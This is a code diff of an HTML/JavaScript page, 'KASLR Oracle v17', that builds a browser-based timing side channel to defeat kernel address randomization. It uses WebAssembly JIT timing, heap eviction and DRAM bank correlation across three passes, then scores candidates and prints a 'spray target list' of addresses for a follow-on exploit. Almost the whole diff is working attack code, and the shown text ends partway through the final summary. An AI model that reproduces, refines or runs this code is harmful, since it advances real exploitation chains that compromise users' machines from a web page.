@@ -1,39 +1,33 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>KASLR Oracle v16</title></head>
+<head><meta charset="utf-8"><title>KASLR Oracle v17</title></head>
 <body>
 <pre id="log"></pre>
 <script>
-// timer-kaslr-v16
+// timer-kaslr-v17
 //
-// v15 results: HIGH=95 candidates, 0.095s brute-force time.
-//   T4 self-eviction WORKED: 3 clusters (0ns, 48-100ns, 160-167ns)
-//   T5 SAB floor WORKED: all 4 anchors evictable, hot ≥5ns
-//   T7x: 17 bank pairs, massive eff values
-//   T10: still 95 HIGH candidates all scoring 185 (contiguous VA band)
+// v16 failure: per-pass entropy recomputation.
+//   Pass 1: T4 fallback 60MB → 4 clusters → leaked=10 → 512 candidates
+//   Pass 2: fresh allocs all land in DRAM (30-99ns, 1 cluster) → leaked=4 → 32768 candidates
+//   Pass 3: same → 32768 candidates
+//   Intersection of different-sized candidate spaces = 0 → fallback → 12631 garbage.
 //
-// v16: MULTI-RUN INTERSECTION
-//   Problem: bank scoring can't narrow below ~95 within one run because
-//   the VA→PA periodicity means multiple VA candidates predict same banks.
-//   Solution: run the oracle 3× (with page-reload between? no — we use
-//   setTimeout re-init to force new Gigacage allocation placement).
-//   Each independent run gives a fresh HIGH set. Intersecting 3 runs
-//   collapses to ~1-5 candidates.
+// v17 fix: FIXED CANDIDATE SPACE
+//   1. T3 + T4 run once to establish global entropy → fixed 512-candidate space.
+//   2. Run 3 bank-collection passes (fresh anchors+bufs each time).
+//   3. Each pass scores ALL 512 candidates using bank pairs.
+//   4. ACCUMULATE bank evidence per alloc ID across passes:
+//      - alloc that bank-matches anc0 in 2/3 passes → confirmed match
+//      - alloc that only matches in 1/3 passes → noise
+//   5. Score 512 candidates using confirmed matches (higher weight for multi-pass matches).
+//   6. Output HIGH set from accumulated score.
 //
-//   Implementation: instead of page reload, we:
-//   1. Free and re-allocate all heap bufs (new bmalloc allocations)
-//   2. Re-run T4, T7x, T10 for each pass
-//   3. Collect HIGH set per pass
-//   4. Intersect all passes' HIGH sets
-//   5. Output intersection as final spray list
+// Result: even if each pass gives only 7-17 pairs, 3 passes with
+//         cross-pass confirmation filter removes noise → tighter scoring.
 //
-//   Note: data anchors (T5) are re-built each pass too since anchor PA
-//   placement also shifts. evictA (T3) is built once — JIT code stays
-//   in same memory across the run.
-//
-// v16 also improves T10 scoring: instead of binary HIGH/MED/LOW, uses
-// a WEIGHTED VOTE across passes — candidates that score HIGH in ALL passes
-// win, candidates that score MED in some passes rank below pure-HIGH.
+// Key insight: bank evidence accumulation is independent of T4 spread.
+//   T4 gives cluster bits. Bank pairs give PA position bits.
+//   These are ADDITIVE — accumulate separately, combine at T10.
 
 const LOG = document.getElementById('log');
 const log = s => { LOG.textContent += s + '\n'; console.log(s); };
@@ -100,6 +94,18 @@ function selfEvict(bufs) {
   if(bufs.length>0) bufs[0].ch.arr[0]^=idx&0;
 }
 
+function clusterMedians(medians){
+  const clusters=[];
+  let cur=[medians[0]];
+  for(let i=1;i<medians.length;i++){
+    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>15){
+      clusters.push([...cur]); cur=[medians[i]];
+    } else cur.push(medians[i]);
+  }
+  clusters.push(cur);
+  return clusters;
+}
+
 // ─────────────────────────────────────────────────────────────
 // T1: Calibrate
 // ─────────────────────────────────────────────────────────────
@@ -136,10 +142,10 @@ async function t2() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// T3: Wasm JIT (once per session — JIT pool is stable)
+// T3: Wasm JIT (once — stable per session)
 // ─────────────────────────────────────────────────────────────
 async function t3() {
-  log('─── T3: Wasm JIT (96 modules, evictA for partition detection) ───');
+  log('─── T3: Wasm JIT (96 modules) ───');
   const makeWasm = (lo, hi) => new Uint8Array([
     0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
     0x01,0x06,0x01,0x60,0x01,0x7f,0x01,0x7f,
@@ -166,7 +172,6 @@ async function t3() {
   log(`[*] T3 building evictA (24MB)...`);
   const evictA = buildChase(24*1024*1024);
   await new Promise(r=>setTimeout(r,30));
-
   for(const {fn} of fns){ let x=0; for(let i=0;i<200;i++) x+=fn(i); }
 
   const BATCH=64, ROUNDS=8;
@@ -195,13 +200,10 @@ async function t3() {
     const std=Math.sqrt(rs.reduce((a,b)=>a+(b-mean)**2,0)/rs.length);
     return {id, cold:p25, hot:hotAcc[id]/ROUNDS*NS, cv:std/Math.max(mean,0.1)};
   });
-
   results.sort((a,b)=>b.cold-a.cold);
   const cMin=Math.min(...results.map(r=>r.cold));
   const cMax=Math.max(...results.map(r=>r.cold));
-  log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns ratio=${(cMax/Math.max(cMin,0.1)).toFixed(1)}x`);
-  log(`[*] T3 top-5: ${results.slice(0,5).map(r=>`m${r.id}=${r.cold.toFixed(0)}ns(cv=${r.cv.toFixed(1)})`).join(' ')}`);
-
+  log(`[*] T3 cold p25 spread: min=${cMin.toFixed(0)}ns max=${cMax.toFixed(0)}ns`);
   const slcHot=results.filter(r=>r.cold<40);
   const dramCold=results.filter(r=>r.cold>=40);
   log(`[*] T3 SLC-pinned (<40ns): ${slcHot.length}  DRAM-evictable (≥40ns): ${dramCold.length}`);
@@ -210,15 +212,12 @@ async function t3() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// ONE PASS: allocate bufs → T4 → T5 → T7x → score
-// Called 3× with fresh allocations each time
+// T4: Heap fingerprint (once — establishes global entropy)
 // ─────────────────────────────────────────────────────────────
-async function runPass(passIdx, evictA, jitData) {
-  log(`\n═══ PASS ${passIdx+1}/3 ═══`);
-
-  // ── T4: Heap fingerprint (self-eviction) ──
-  log(`─── P${passIdx+1} T4: Heap fingerprint ───`);
+async function t4() {
+  log('─── T4: Heap fingerprint ───');
   const N=32, SZ=2*1024*1024, STEPS=64, REPS=20;
+  log(`[*] T4 allocating ${N} × 2MB...`);
   const bufs=[];
   for(let i=0;i<N;i++) bufs.push({ch:buildChase(SZ), id:i});
   await new Promise(r=>setTimeout(r,50));
@@ -234,22 +233,15 @@ async function runPass(passIdx, evictA, jitData) {
     }
     bufs[0].ch.arr[0]^=idx2&0;
     for(let i=0;i<N;i++)
-      timingSets[i].push(chaseTime(bufs[i].ch.arr, (rep*7)%bufs[i].ch.entries, STEPS));
+      timingSets[i].push(chaseTime(bufs[i].ch.arr,(rep*7)%bufs[i].ch.entries,STEPS));
   }
 
-  const medians=timingSets.map((ts,i)=>{
-    ts.sort((a,b)=>a-b);
-    return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS};
-  });
+  let medians=timingSets.map((ts,i)=>{ ts.sort((a,b)=>a-b); return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS}; });
   medians.sort((a,b)=>a.ns-b.ns);
+  const tMax=medians[medians.length-1].ns;
 
-  const tMin=medians[0].ns, tMax=medians[medians.length-1].ns;
-  log(`[*] P${passIdx+1} T4 spread: ${tMin.toFixed(1)}–${tMax.toFixed(1)}ns`);
-
-  // If all-zero, try large eviction fallback
-  let finalMedians = medians;
-  if(tMax < 10){
-    log(`[!] P${passIdx+1} T4 all-zero — fallback 60MB evict`);
+  if(tMax<10){
+    log(`[!] T4 self-eviction gave all-0ns — trying 60MB external eviction`);
     const evictLarge=buildChase(60*1024*1024);
     await new Promise(r=>setTimeout(r,30));
     const ts2=bufs.map(()=>[]);
@@ -260,24 +252,55 @@ async function runPass(passIdx, evictA, jitData) {
     }
     const med2=ts2.map((ts,i)=>{ ts.sort((a,b)=>a-b); return {id:i, ns:ts[Math.floor(ts.length*0.25)]*NS}; });
     med2.sort((a,b)=>a.ns-b.ns);
-    if(med2[med2.length-1].ns > tMax) finalMedians=med2;
+    if(med2[med2.length-1].ns>tMax){ medians=med2; log(`[*] T4 large-evict used`); }
   }
 
-  const clusters=clusterMedians(finalMedians);
-  log(`[*] P${passIdx+1} T4 clusters (${clusters.length}): `+clusters.map((cl,ci)=>{
+  const clusters=clusterMedians(medians);
+  log(`[*] T4 spread: ${medians[0].ns.toFixed(1)}-${medians[medians.length-1].ns.toFixed(1)}ns`);
+  log(`[*] T4 clusters (${clusters.length}): `+clusters.map((cl,ci)=>{
     const ns=cl.map(m=>m.ns);
     return `C${ci}:${cl.length}allocs(${Math.min(...ns).toFixed(0)}-${Math.max(...ns).toFixed(0)}ns)`;
   }).join(' | '));
+  if(clusters.length>=2) log(`[!!!] T4 HEAP CLUSTERS: ${clusters.length} groups`);
 
-  const heapData={bufs, medians:finalMedians, clusters};
+  return {medians, clusters, bufs};
+}
 
-  // ── T5: Data anchor validation ──
-  log(`─── P${passIdx+1} T5: Anchor validation ───`);
+// ─────────────────────────────────────────────────────────────
+// T6: Global entropy (computed ONCE from T3+T4)
+// ─────────────────────────────────────────────────────────────
+function t6(jitData, heapData) {
+  log('─── T6: Bit extraction + entropy (GLOBAL — fixed for all passes) ───');
+  const dramCold=jitData.results.filter(r=>r.cold>=40);
+  const numClusters=heapData.clusters.length;
+  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
+  const jitPartBit=(jitData.slcHot.length>0&&dramCold.length>0)?1:0;
+  const heapMax=heapData.medians[heapData.medians.length-1].ns;
+  const heapMin=heapData.medians[0].ns;
+  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(heapMax/Math.max(heapMin,1),2))));
+  const totalLeaked=pageColorBits+jitPartBit+clusterBits;
+  const aslrBits=19;
+  const remaining=Math.max(0,aslrBits-totalLeaked);
+  log(`[*] T6 page color: ${pageColorBits}b  JIT partition: ${jitPartBit}b  heap cluster: ${clusterBits}b`);
+  log(`[*] T6 total leaked: ${totalLeaked} / ${aslrBits} bits → remaining: ${remaining} bits = ${(2**remaining).toLocaleString()} candidates`);
+  if(remaining<=12) log(`[!!!] T6 BRUTE-FORCEABLE: ${2**remaining} candidates at 1ms/probe → ${((2**remaining)/1000).toFixed(3)}s`);
+  return {remaining, totalLeaked, pageColorBits, jitPartBit, clusterBits, numClusters,
+    slcCount:jitData.slcHot.length, dramCount:jitData.dramCold.length};
+}
+
+// ─────────────────────────────────────────────────────────────
+// BANK PASS: collect bank pairs from fresh anchors + existing bufs
+// ─────────────────────────────────────────────────────────────
+async function bankPass(passIdx, bufs, evictA) {
+  log(`\n─── BANK PASS ${passIdx+1}/3 ───`);
+
+  // Build fresh anchors each pass — anchor PA placement shifts
   const N_ANCHORS=4, ANCHOR_SZ=256*1024, ASTEPS=256, REPS_HOT=16, REPS_COLD=8;
   const anchors=[];
   for(let i=0;i<N_ANCHORS;i++) anchors.push({ch:buildChase(ANCHOR_SZ), id:i});
-  await new Promise(r=>setTimeout(r,30));
+  await new Promise(r=>setTimeout(r,20));
 
+  // Warm
   for(const a of anchors){
     let idx=0;
     for(let p=0;p<4;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
@@ -285,6 +308,7 @@ async function runPass(passIdx, evictA, jitData) {
   }
   await new Promise(r=>setTimeout(r,10));
 
+  // Hot measurement
   const hotNS=anchors.map(a=>{
     const ts=[];
     for(let r=0;r<REPS_HOT;r++) ts.push(chaseTime(a.ch.arr,0,ASTEPS)*NS);
@@ -292,18 +316,19 @@ async function runPass(passIdx, evictA, jitData) {
     return Math.max(ts[Math.floor(ts.length*0.25)], 5.0);
   });
 
+  // Re-warm
   for(const a of anchors){
     let idx=0;
     for(let p=0;p<2;p++) for(let i=0;i<a.ch.entries;i++) idx=a.ch.arr[idx*16];
     a.ch.arr[0]^=idx&0;
   }
 
+  // Cold validation
   const coldNS=anchors.map(a=>{
     const ts=[];
     for(let r=0;r<REPS_COLD;r++){
       evictFull(evictA); evictFull(evictA);
-      const t0=rdcnt();
-      let idx=0;
+      const t0=rdcnt(); let idx=0;
       for(let s=0;s<ASTEPS;s++) idx=a.ch.arr[idx*16];
       ts.push((rdcnt()-t0+(idx&0))/ASTEPS*NS);
     }
@@ -312,16 +337,13 @@ async function runPass(passIdx, evictA, jitData) {
   });
 
   const evictableAnchors=anchors.filter((_,i)=>coldNS[i]>hotNS[i]*2&&coldNS[i]>80);
-  log(`[*] P${passIdx+1} T5 anchors: ${evictableAnchors.length}/${N_ANCHORS} evictable`+
-    anchors.map((a,i)=>`  anc${i}:hot=${hotNS[i].toFixed(0)}ns cold=${coldNS[i].toFixed(0)}ns ${coldNS[i]>hotNS[i]*2&&coldNS[i]>80?'✓':'✗'}`).join(''));
+  log(`[*] P${passIdx+1} anchors: ${evictableAnchors.length}/${N_ANCHORS} evictable`+
+    anchors.map((a,i)=>`  anc${i}:${coldNS[i]>hotNS[i]*2&&coldNS[i]>80?coldNS[i].toFixed(0)+'ns✓':'✗'}`).join(''));
 
   const useAnchors=evictableAnchors.length>0?evictableAnchors:anchors;
-  const anchorData={anchors, evictableAnchors:useAnchors, hotNS, coldNS};
 
-  // ── T7x: Bank correlation ──
-  log(`─── P${passIdx+1} T7x: Bank mapping ───`);
+  // T7x bank correlation
   const BASELINE_MIN_NS=60, CORR_THRESHOLD=1.3, BSTEPS=128, REPS_BASE=3, REPS_EVICT=6;
-
   const bankTable=[];
   const correlatedPairs=[];
 
@@ -331,12 +353,11 @@ async function runPass(passIdx, evictA, jitData) {
     a.ch.arr[0]^=idx&0;
   }
 
+  const N=bufs.length;
   for(let i=0;i<N;i++){
     if(i>0&&i%2===0) await new Promise(r=>setTimeout(r,0));
-    const buf=heapData.bufs[i];
-    const heapNs=heapData.medians.find(m=>m.id===buf.id)?.ns||0;
+    const buf=bufs[i];
     let allocBankScore=0, allocMaxEff=0;
-    const matches=[];
 
     for(const anc of useAnchors){
       warmAnchor(anc);
@@ -349,7 +370,7 @@ async function runPass(passIdx, evictA, jitData) {
       }
       bTs.sort((a,b)=>a-b);
       const freshBase=bTs[Math.floor(bTs.length*0.25)];
-      if(freshBase<BASELINE_MIN_NS){ matches.push({ancId:anc.id,skipped:true}); continue; }
+      if(freshBase<BASELINE_MIN_NS) continue;
 
       const eTs=[];
       for(let r=0;r<REPS_EVICT;r++){
@@ -364,160 +385,236 @@ async function runPass(passIdx, evictA, jitData) {
       const postEvict=eTs[Math.floor(eTs.length*0.25)];
       const eff=postEvict/Math.max(freshBase,1);
       const correlated=eff>=CORR_THRESHOLD;
-      matches.push({ancId:anc.id,freshBase,postEvict,eff,correlated,skipped:false});
       if(correlated){
-        correlatedPairs.push({allocId:buf.id,heapNs,ancId:anc.id,eff,freshBase,postEvict});
+        correlatedPairs.push({allocId:buf.id, ancId:anc.id, eff, freshBase, postEvict});
         allocBankScore+=eff; allocMaxEff=Math.max(allocMaxEff,eff);
       }
     }
-    bankTable.push({allocId:buf.id,heapNs,matches,allocBankScore,allocMaxEff});
+    bankTable.push({allocId:buf.id, allocBankScore, allocMaxEff});
   }
 
-  log(`[*] P${passIdx+1} T7x pairs: ${correlatedPairs.length}`);
+  log(`[*] P${passIdx+1} pairs: ${correlatedPairs.length}`);
   correlatedPairs.forEach(p=>{
-    log(`[!!!] P${passIdx+1} BANK: alloc[${p.allocId}](${p.heapNs.toFixed(0)}ns)↔anc${p.ancId} eff=${(p.eff*100).toFixed(0)}%`);
+    log(`[!!!] P${passIdx+1} BANK: alloc[${p.allocId}]↔anc${p.ancId} eff=${(p.eff*100).toFixed(0)}%`);
   });
 
-  const bankData={bankTable, correlatedPairs, anchors:useAnchors};
+  return {correlatedPairs, bankTable, passIdx};
+}
 
-  // ── T10-pass: Score all candidates for THIS pass ──
-  const PAGE_SIZE=16384;
-  const ASLR_BITS=19;
+// ─────────────────────────────────────────────────────────────
+// T10: Score 512 candidates using ACCUMULATED evidence
+// ─────────────────────────────────────────────────────────────
+function t10(jitData, heapData, allPasses, entropyData) {
+  log('\n─── T10: Candidate scorer (v17 — accumulated bank evidence) ───');
 
-  const slcCount=jitData.slcHot.length;
-  const dramCount=jitData.dramCold.length;
-  const slcRatio=slcCount/(slcCount+dramCount);
-  const numClusters=clusters.length;
-  const clusterBits=Math.min(4,Math.ceil(Math.log2(Math.max(numClusters,2))));
-  const pageColorBits=Math.min(7,Math.ceil(Math.log2(Math.max(finalMedians[finalMedians.length-1].ns/Math.max(finalMedians[0].ns,1),2))));
-  const jitPartBit=(jitData.slcHot.length>0&&jitData.dramCold.length>0)?1:0;
-  const totalLeaked=pageColorBits+jitPartBit+clusterBits;
-  const remaining=Math.max(0,ASLR_BITS-totalLeaked);
+  const remaining=entropyData.remaining;
   const candidateCount=2**remaining;
+  const PAGE_SIZE=16384;
 
-  log(`[*] P${passIdx+1} entropy: leaked=${totalLeaked} remaining=${remaining} candidates=${candidateCount}`);
+  log(`[*] T10 scoring ${candidateCount} candidates (${remaining} bits remaining)`);
+  log(`[*] T10 mode: ACCUMULATED bank evidence across ${allPasses.length} passes`);
 
-  const c0Size=clusters[0]?.length||0;
-  const c0Ratio=c0Size/32;
-  const t4Failed=c0Ratio>=0.95;
-  const pairCount=correlatedPairs.length;
-  const hitAncs=[...new Set(correlatedPairs.map(p=>p.ancId))];
-
-  let corrAllocsInDRAM=0, corrAllocsInC0=0, multiAnchorAllocs=0;
-  let effHeapSpearman=0, maxEffAlloc=null;
-  let anchorGroupSizes=[];
-  let bankWeightedAllocIndex=NaN;
-
-  if(pairCount>0){
-    const c0Ids=new Set(clusters[0]?.map(m=>m.id)||[]);
-    const corrAllocIds=new Set(correlatedPairs.map(p=>p.allocId));
-    corrAllocIds.forEach(id=>{ if(c0Ids.has(id)) corrAllocsInC0++; else corrAllocsInDRAM++; });
-    const ancHitCount={};
-    correlatedPairs.forEach(p=>{ ancHitCount[p.allocId]=(ancHitCount[p.allocId]||0)+1; });
-    multiAnchorAllocs=Object.values(ancHitCount).filter(n=>n>=2).length;
-    const ancGroups={};
-    correlatedPairs.forEach(p=>{ if(!ancGroups[p.ancId]) ancGroups[p.ancId]=[]; ancGroups[p.ancId].push(p.allocId); });
-    anchorGroupSizes=hitAncs.map(id=>(ancGroups[id]||[]).length);
-
-    if(t4Failed&&bankTable.length>0){
-      const scoredAllocs=bankTable.filter(b=>b.allocBankScore>0);
-      const totalScore=scoredAllocs.reduce((a,b)=>a+b.allocBankScore,0);
-      bankWeightedAllocIndex=scoredAllocs.reduce((a,b)=>a+b.allocId*b.allocBankScore,0)/Math.max(totalScore,1);
-    }
-
-    const corrAllocData=bankTable.filter(b=>b.allocBankScore>0);
-    if(corrAllocData.length>=3){
-      const byScore=[...corrAllocData].sort((a,b)=>b.allocBankScore-a.allocBankScore);
-      const byIndex=[...corrAllocData].sort((a,b)=>a.allocId-b.allocId);
-      const scoreRankMap={}, indexRankMap={};
-      byScore.forEach((d,i)=>{ scoreRankMap[d.allocId]=i; });
-      byIndex.forEach((d,i)=>{ indexRankMap[d.allocId]=i; });
-      const n=corrAllocData.length;
-      let dSq=0;
-      corrAllocData.forEach(d=>{ const diff=scoreRankMap[d.allocId]-indexRankMap[d.allocId]; dSq+=diff*diff; });
-      effHeapSpearman=1-(6*dSq)/(n*(n*n-1));
-    }
-
-    if(bankTable.length>0){
-      maxEffAlloc=bankTable.filter(b=>b.allocMaxEff>0).reduce((a,b)=>a&&a.allocMaxEff>b.allocMaxEff?a:b,null);
+  // Build accumulated evidence map:
+  //   allocMatchCount[allocId][ancId] = number of passes where this pair was confirmed
+  const allocMatchCount={};
+  for(const pass of allPasses){
+    for(const p of pass.correlatedPairs){
+      if(!allocMatchCount[p.allocId]) allocMatchCount[p.allocId]={};
+      allocMatchCount[p.allocId][p.ancId]=(allocMatchCount[p.allocId][p.ancId]||0)+1;
     }
   }
 
-  // Score candidates
+  // Build confirmed pairs: only those matching in ≥2 passes
+  const confirmedPairs=[];
+  const tentativePairs=[]; // matched in 1 pass only (lower weight)
+  for(const [allocId, ancMap] of Object.entries(allocMatchCount)){
+    for(const [ancId, count] of Object.entries(ancMap)){
+      if(count>=2) confirmedPairs.push({allocId:parseInt(allocId), ancId:parseInt(ancId), count});
+      else tentativePairs.push({allocId:parseInt(allocId), ancId:parseInt(ancId), count});
+    }
+  }
+
+  log(`[*] T10 confirmed pairs (≥2/3 passes): ${confirmedPairs.length}`);
+  log(`[*] T10 tentative pairs (1/3 passes): ${tentativePairs.length}`);
+  confirmedPairs.forEach(p=>{
+    log(`[*] T10   CONFIRMED: alloc[${p.allocId}]↔anc${p.ancId} (${p.count}/3 passes)`);
+  });
+
+  // Bank topology metrics from accumulated data
+  const slcRatio=entropyData.slcCount/(entropyData.slcCount+entropyData.dramCount);
+  const c0Size=heapData.clusters[0]?.length||0;
+  const c0Ratio=c0Size/32;
+  const heapSpread=heapData.medians[heapData.medians.length-1].ns;
+
+  // Confirmed bank topology
+  const hitAncs=[...new Set(confirmedPairs.map(p=>p.ancId))];
+  const confirmedAllocIds=new Set(confirmedPairs.map(p=>p.allocId));
+  const allBankAllocIds=new Set([...confirmedPairs,...tentativePairs].map(p=>p.allocId));
+
+  // Multi-anchor confirmed allocs (strongest signal)
+  const confirmedAncPerAlloc={};
+  confirmedPairs.forEach(p=>{
+    if(!confirmedAncPerAlloc[p.allocId]) confirmedAncPerAlloc[p.allocId]=new Set();
+    confirmedAncPerAlloc[p.allocId].add(p.ancId);
+  });
+  const multiAnchorConfirmed=Object.values(confirmedAncPerAlloc).filter(s=>s.size>=2).length;
+  const confirmedAllocList=[...confirmedAllocIds];
+
+  // Accumulated bank score per alloc
+  const accumBankScore={};
+  for(const pass of allPasses){
+    for(const b of pass.bankTable){
+      accumBankScore[b.allocId]=(accumBankScore[b.allocId]||0)+b.allocBankScore;
+    }
+  }
+
+  // Spearman: alloc index vs accumulated bank score (cross-pass)
+  const scoredAllocData=Object.entries(accumBankScore).filter(([,v])=>v>0).map(([id,score])=>({allocId:parseInt(id),score}));
+  let effHeapSpearman=0;
+  if(scoredAllocData.length>=3){
+    const byScore=[...scoredAllocData].sort((a,b)=>b.score-a.score);
+    const byIndex=[...scoredAllocData].sort((a,b)=>a.allocId-b.allocId);
+    const scoreRankMap={}, indexRankMap={};
+    byScore.forEach((d,i)=>{ scoreRankMap[d.allocId]=i; });
+    byIndex.forEach((d,i)=>{ indexRankMap[d.allocId]=i; });
+    const n=scoredAllocData.length;
+    let dSq=0;
+    scoredAllocData.forEach(d=>{ const diff=scoreRankMap[d.allocId]-indexRankMap[d.allocId]; dSq+=diff*diff; });
+    effHeapSpearman=1-(6*dSq)/(n*(n*n-1));
+  }
+
+  // Bank-weighted alloc index (PA position proxy)
+  const totalAccumScore=scoredAllocData.reduce((a,b)=>a+b.score,0);
+  const bankWeightedAllocIndex=totalAccumScore>0
+    ? scoredAllocData.reduce((a,b)=>a+b.allocId*b.score,0)/totalAccumScore
+    : NaN;
+
+  // Max-eff alloc index
+  const maxEffAllocEntry=scoredAllocData.reduce((a,b)=>a&&a.score>b.score?a:b,null);
+
+  // Per-anchor group sizes from confirmed pairs
+  const anchorGroupSizes=hitAncs.map(ancId=>confirmedPairs.filter(p=>p.ancId===ancId).length);
+
+  log(`[*] T10 confirmed allocs: ${[...confirmedAllocIds].join(',')} multi-anc: ${multiAnchorConfirmed}`);
+  log(`[*] T10 spearman(idx,accScore): ${effHeapSpearman.toFixed(3)}  bankWeightedIdx: ${isNaN(bankWeightedAllocIndex)?'N/A':bankWeightedAllocIndex.toFixed(1)}`);
+
+  // Score all candidates
   const scores=[];
-  const heapSpread=finalMedians[finalMedians.length-1].ns;
+  const t4Failed=c0Ratio>=0.95;
+
   for(let c=0;c<candidateCount;c++){
     let score=50;
+    const breakdown=[];
     const frac=c/candidateCount;
 
+    // A: JIT SLC ratio
     const expectedHighSLC=frac<0.5;
     const observedHighSLC=slcRatio>0.6;
-    if(expectedHighSLC===observedHighSLC) score+=30; else score-=15;
+    if(expectedHighSLC===observedHighSLC){ score+=30; breakdown.push('JIT+30'); }
+    else { score-=15; breakdown.push('JIT-15'); }
 
     if(!t4Failed){
+      // B: Heap cluster spread
       const expectedLargeC0=frac<0.6;
       const observedLargeC0=c0Ratio>0.5;
-      if(expectedLargeC0===observedLargeC0) score+=25; else score-=10;
+      if(expectedLargeC0===observedLargeC0){ score+=25; breakdown.push('HEAP+25'); }
+      else { score-=10; breakdown.push('HEAP-10'); }
+
       const expectedHighSpread=frac>0.3;
-      if(expectedHighSpread===(heapSpread>500)) score+=10;
+      if(expectedHighSpread===(heapSpread>500)){ score+=10; breakdown.push('SPREAD+10'); }
     }
 
-    if(pairCount===0) score-=5; else score+=15;
-    if(multiAnchorAllocs>=3) score+=25;
-    else if(multiAnchorAllocs>=2) score+=15;
-    else if(multiAnchorAllocs===1) score+=8;
+    // C: Confirmed bank pairs credit (cross-pass verified)
+    if(confirmedPairs.length>=3){ score+=25; breakdown.push('CBANK+25'); }
+    else if(confirmedPairs.length>=1){ score+=15; breakdown.push('CBANK+15'); }
+    else if(tentativePairs.length>0){ score+=5; breakdown.push('TBANK+5'); }
+    else { score-=5; breakdown.push('BANK-5'); }
 
+    // D: Multi-anchor confirmed allocs
+    if(multiAnchorConfirmed>=2){ score+=25; breakdown.push('CMANC+25'); }
+    else if(multiAnchorConfirmed>=1){ score+=15; breakdown.push('CMANC+15'); }
+    else if(confirmedAllocIds.size>=2){ score+=10; breakdown.push('MANC+10'); }
+
+    // E: Bank-weighted alloc index → anchor PA position
     if(!isNaN(bankWeightedAllocIndex)){
       const normIdx=bankWeightedAllocIndex/31.0;
       const expected=frac>normIdx*0.5&&frac<normIdx*0.5+0.5;
-      if(expected) score+=30; else score-=5;
+      if(expected){ score+=30; breakdown.push('IDX+30'); }
+      else { score-=5; breakdown.push('IDX-5'); }
     }
 
+    // F: Spearman correlation
     if(effHeapSpearman>0.4){
-      if(frac>0.5) score+=20; else score-=5;
+      if(frac>0.5){ score+=20; breakdown.push('SPEAR+20'); }
+      else { score-=5; breakdown.push('SPEAR-5'); }
     } else if(effHeapSpearman<-0.4){
-      if(frac<0.5) score+=20; else score-=5;
-    } else if(Math.abs(effHeapSpearman)>0.2) score+=10;
+      if(frac<0.5){ score+=20; breakdown.push('SPEAR+20'); }
+      else { score-=5; breakdown.push('SPEAR-5'); }
+    } else if(Math.abs(effHeapSpearman)>0.2){ score+=10; breakdown.push('SPEAR+10'); }
 
-    if(maxEffAlloc){
-      const maxIdx=maxEffAlloc.allocId/31.0;
-      if(Math.abs(frac-(0.3+maxIdx*0.5))<0.25) score+=15;
+    // G: Max-eff alloc index
+    if(maxEffAllocEntry){
+      const maxIdx=maxEffAllocEntry.allocId/31.0;
+      if(Math.abs(frac-(0.3+maxIdx*0.5))<0.25){ score+=15; breakdown.push('MEFF+15'); }
     }
 
+    // H: Per-anchor group size (confirmed pairs only)
     const maxGroupSize=Math.max(...anchorGroupSizes,0);
-    if(maxGroupSize>=4) score+=15;
-    else if(maxGroupSize>=2) score+=8;
+    if(maxGroupSize>=4){ score+=15; breakdown.push('GRP+15'); }
+    else if(maxGroupSize>=2){ score+=8; breakdown.push('GRP+8'); }
 
-    scores.push({c, score});
+    scores.push({c, score, va:`base+0x${(c*PAGE_SIZE).toString(16).toUpperCase().padStart(8,'0')}`, breakdown});
   }
 
   scores.sort((a,b)=>b.score-a.score||a.c-b.c);
+
+  const scoreMap={};
+  scores.forEach(s=>{ scoreMap[s.score]=(scoreMap[s.score]||0)+1; });
+  const scoreKeys=Object.keys(scoreMap).map(Number).sort((a,b)=>b-a);
+  log(`[*] T10 score distribution:`);
+  scoreKeys.slice(0,8).forEach(k=>log(`[*] T10   score ${k}: ${scoreMap[k]} candidates`));
+
+  log(`[*] T10 top-32 candidates:`);
+  log(`[*] T10   rank  cand  score  VA-offset          breakdown`);
+  scores.slice(0,32).forEach((s,i)=>{
+    log(`[*] T10   ${String(i+1).padStart(4)}  0x${s.c.toString(16).padStart(4,'0')}  ${String(s.score).padStart(3)}    ${s.va}  [${s.breakdown.join('|')}]`);
+  });
+
   const topScore=scores[0].score;
-  const highSet=new Set(scores.filter(s=>s.score>=topScore-5).map(s=>s.c));
-  const scoredMap={};
-  scores.forEach(s=>{ scoredMap[s.c]=s.score; });
+  const highConf=scores.filter(s=>s.score>=topScore-5);
+  const medConf=scores.filter(s=>s.score>=topScore-20&&s.score<topScore-5);
+  const lowConf=scores.filter(s=>s.score<topScore-20);
+  log(`[*] T10 confidence: HIGH=${highConf.length} MED=${medConf.length} LOW=${lowConf.length}`);
 
-  log(`[*] P${passIdx+1} HIGH set size: ${highSet.size} candidates (score ≥${topScore-5})`);
-  return {highSet, scoredMap, candidateCount, remaining, totalLeaked, pairCount};
-}
-
-function clusterMedians(medians){
-  const clusters=[];
-  let cur=[medians[0]];
-  for(let i=1;i<medians.length;i++){
-    if(medians[i].ns>medians[i-1].ns*1.4&&medians[i].ns-medians[i-1].ns>15){
-      clusters.push([...cur]); cur=[medians[i]];
-    } else cur.push(medians[i]);
+  const sprayRaw=scores.slice(0,Math.min(highConf.length+medConf.length,128)).map(s=>s.c*PAGE_SIZE);
+  sprayRaw.sort((a,b)=>a-b);
+  const sprayFilled=[...sprayRaw];
+  for(let i=0;i<sprayRaw.length-1;i++){
+    if(sprayRaw[i+1]-sprayRaw[i]===2*PAGE_SIZE) sprayFilled.push(sprayRaw[i]+PAGE_SIZE);
   }
-  clusters.push(cur);
-  return clusters;
+  sprayFilled.sort((a,b)=>a-b);
+  const sprayHex=sprayFilled.map(v=>`0x${v.toString(16).toUpperCase().padStart(8,'0')}`);
+
+  log(`[!!!] T10 SPRAY TARGET LIST (${sprayHex.length} addresses):`);
+  for(let i=0;i<sprayHex.length;i+=8)
+    log(`[!!!] T10   ${sprayHex.slice(i,i+8).join('  ')}`);
+
+  log(`\n[*] T10 === KASLR DEFEAT SUMMARY (v17) ===`);
